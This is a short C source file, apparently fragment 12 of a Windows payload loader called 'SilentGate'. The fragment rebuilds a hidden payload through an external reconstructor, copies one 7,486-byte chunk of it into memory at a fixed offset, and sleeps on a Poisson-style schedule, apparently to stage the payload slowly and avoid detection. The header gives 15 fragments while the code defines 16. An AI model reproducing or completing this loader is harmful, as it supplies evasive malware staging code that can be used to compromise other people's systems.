/*
 * SilentGate Fragment 12/15
 * Offset: 89832 bytes  Size: 7486 bytes
 * Schedule: t=874ms (Poisson process)
 * Author: JarDani
 */

#include <windows.h>
#include <math.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FRAGMENT_ID   12
#define N_FRAGMENTS   16
#define PAYLOAD_SIZE  119778
#define CHUNK_OFFSET  89832
#define CHUNK_SIZE    7486
#define SLEEP_NEXT_MS 874

/* Forward declaration of reconstructor */
extern unsigned char* sg_reconstruct(int* out_len);


/* Fragment 12: Write chunk 12 */
void sg_execute_fragment_12(PVOID mem) {
    if (!mem) return;
    printf("[FRAG 12] Writing chunk at t=874ms\n");

    int len = 0;
    unsigned char* payload = sg_reconstruct(&len);
    memcpy((BYTE*)mem + CHUNK_OFFSET, payload + CHUNK_OFFSET, CHUNK_SIZE);
    free(payload);

    printf("[FRAG 12] Chunk 12 written at offset %d\n", CHUNK_OFFSET);
    Sleep(SLEEP_NEXT_MS);
}
